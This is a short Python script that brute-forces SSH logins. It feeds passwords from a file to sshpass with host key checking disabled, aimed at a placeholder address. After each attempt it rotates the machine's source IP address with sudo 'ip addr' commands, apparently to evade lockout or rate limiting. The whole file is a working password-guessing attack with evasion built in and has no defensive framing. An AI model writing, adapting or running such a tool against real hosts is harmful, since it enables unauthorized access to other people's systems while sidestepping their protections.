import subprocess

ips = []
passwds = []
outputlist = []
users = ['']  # list of users to try

for i in range(52, 254):
    ips.append(i)

with open('./passwordfile.txt', 'r') as file1:
    passwds = [line.strip() for line in file1]

count = 0
ip_index = 0
passwd_index = 0

while passwd_index < len(passwds):
    for user in users:
        for ps in passwds:
            print(user,':', ps)
            subprocess.call(['sshpass','-p', ps,'ssh','-o','stricthostkeychecking=no', user + '@' + 'IP ADDR'])
            ip = ips[ip_index]
            old_ip = ip - 1
            set_ip = subprocess.call(['sudo', 'ip', 'addr', 'add', 'IP ADDR' + str(ip) + '/24', 'dev', 'enp0s8'])
            rem_ip = subprocess.call(['sudo', 'ip', 'addr', 'delete', 'IP ADDR' + str(old_ip) + '/24', 'dev', 'enp0s8'])
            ip_index += 1
            if ip_index >= len(ips):
                ip_index = 0
            passwd_index += 1
